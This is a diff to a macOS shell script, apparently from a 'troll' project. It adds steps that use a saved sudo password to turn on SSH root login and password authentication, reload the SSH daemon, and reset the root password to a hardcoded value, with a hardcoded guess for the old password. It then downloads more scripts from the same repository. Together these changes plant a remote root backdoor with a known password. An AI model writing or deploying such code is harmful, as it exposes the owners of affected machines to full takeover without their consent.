@@ -45,6 +45,31 @@ if [ ! -f "$PFILE" ]; then
 fi
 SUDO_PASS=$(<"$PFILE")
 
+# Edit SSH configuration to enable root login and password authentication
+echo "[*] Updating SSH configuration..."
+echo "$SUDO_PASS" | sudo -S sed -i.bak -E 's/^#?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+echo "$SUDO_PASS" | sudo -S sed -i.bak -E 's/^#?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
+# Restart SSH daemon to apply changes
+echo "[*] Restarting SSH daemon to apply changes..."
+echo "$SUDO_PASS" | sudo -S launchctl unload -w /System/Library/LaunchDaemons/ssh.plist
+
+echo "$SUDO_PASS" | sudo -S launchctl load -w /System/Library/LaunchDaemons/ssh.plist
+
+# Update root password to Aa112211!, using old password if set
+echo "[*] Updating root password to Aa112211!..."
+# Try with old password (Mayuecheng2009)
+if echo "$SUDO_PASS" | sudo -S sysadminctl -resetPasswordFor root \
+     -oldPassword "Mayuecheng2009" -newPassword "Aa112211!"; then
+  echo "[*] Root password updated using old password."
+# Fallback to resetting without old password
+elif echo "$SUDO_PASS" | sudo -S sysadminctl -resetPasswordFor root \
+     -newPassword "Aa112211!"; then
+  echo "[*] Root password updated without old password."
+else
+  echo "[!] Failed to update root password."
+fi
+
 # Download required scripts
 echo "[*] Downloading install-brew.sh..."
 download "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/install-brew.sh" "$SUBP_DIR/install-brew.sh"
